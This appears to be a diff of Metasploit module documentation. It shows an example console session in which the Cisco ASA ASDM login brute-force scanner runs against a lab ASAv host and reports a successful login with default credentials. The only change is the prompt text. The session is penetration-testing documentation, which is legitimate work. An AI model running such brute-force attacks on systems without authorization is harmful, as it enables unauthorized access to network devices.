@@ -116,17 +116,17 @@ File containing passwords, one per line
 ### ASAv 9.18.1 with ASDM enabled and the `cisco:cisco123` creds set.
 
 ```
-msf6 > use auxiliary/scanner/http/cisco_asa_asdm_bruteforce
-msf6 auxiliary(scanner/http/cisco_asa_asdm_bruteforce) > set RHOST 10.9.49.201
+msf > use auxiliary/scanner/http/cisco_asa_asdm_bruteforce
+msf auxiliary(scanner/http/cisco_asa_asdm_bruteforce) > set RHOST 10.9.49.201
 RHOST => 10.9.49.201
-msf6 auxiliary(scanner/http/cisco_asa_asdm_bruteforce) > set VERBOSE false
+msf auxiliary(scanner/http/cisco_asa_asdm_bruteforce) > set VERBOSE false
 VERBOSE => false
-msf6 auxiliary(scanner/http/cisco_asa_asdm_bruteforce) > run
+msf auxiliary(scanner/http/cisco_asa_asdm_bruteforce) > run
 
 [*] The remote target appears to host Cisco ASA ASDM. The module will continue.
 [*] Starting login brute force...
 [+] SUCCESSFUL LOGIN - "cisco":"cisco123"
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/cisco_asa_asdm_bruteforce) > 
+msf auxiliary(scanner/http/cisco_asa_asdm_bruteforce) > 
 ```
